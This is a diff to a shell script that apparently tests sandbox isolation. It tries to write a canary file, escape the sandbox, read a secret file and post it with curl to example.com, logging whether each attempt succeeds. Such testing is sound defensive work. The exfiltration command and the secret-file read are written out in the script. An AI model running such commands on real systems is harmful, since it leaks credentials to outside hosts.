@@ -17,9 +17,10 @@ LOG="$SCRATCH/attempts.log"
 if echo "pwned" >> "$CANARY" 2>>"$LOG"; then echo "REPO_MUTATED" >> "$LOG"; fi
 if echo "pwned" > "$ESCAPE" 2>>"$LOG"; then echo "ESCAPED" >> "$LOG"; fi
 
-# Read a secret and try to exfiltrate it. Even if the read succeeds, the network
-# denial must stop the send.
+# Read a secret and try to exfiltrate it. The sandbox should block common secret
+# store reads before network policy even matters.
 SECRET="$(cat "$SECRET_FILE" 2>>"$LOG" || echo "")"
+if [ -n "$SECRET" ]; then echo "SECRET_READ" >> "$LOG"; fi
 if command -v curl >/dev/null 2>&1 && curl -m 2 -s -d "stolen=$SECRET" http://example.com >/dev/null 2>>"$LOG"; then
   echo "SENT" >> "$LOG"
 fi
